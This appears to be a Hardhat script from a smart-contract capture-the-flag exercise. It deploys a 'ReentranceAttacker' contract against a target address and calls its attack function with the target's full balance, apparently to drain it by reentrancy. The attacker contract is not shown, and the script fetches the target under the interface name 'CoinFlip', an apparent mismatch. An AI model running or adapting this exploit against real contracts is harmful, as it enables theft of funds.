import { ethers } from "hardhat";

async function main() {
  const reentrance = await ethers.getContractAt("CoinFlip", "0x3988a403EF00364E0E9CdF6Eb1CB16E467cF6140");
  const contractBalance = await ethers.provider.getBalance(reentrance.address);

  const ReentranceAttacker = await ethers.getContractFactory("ReentranceAttacker");
  const reentranceAttacker = await ReentranceAttacker.deploy(reentrance.address);
  console.log("attacker deployed at", reentranceAttacker.address);

  const tx = await reentranceAttacker.attack({ value: contractBalance });
  await tx.wait(1);

  console.log("done!");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
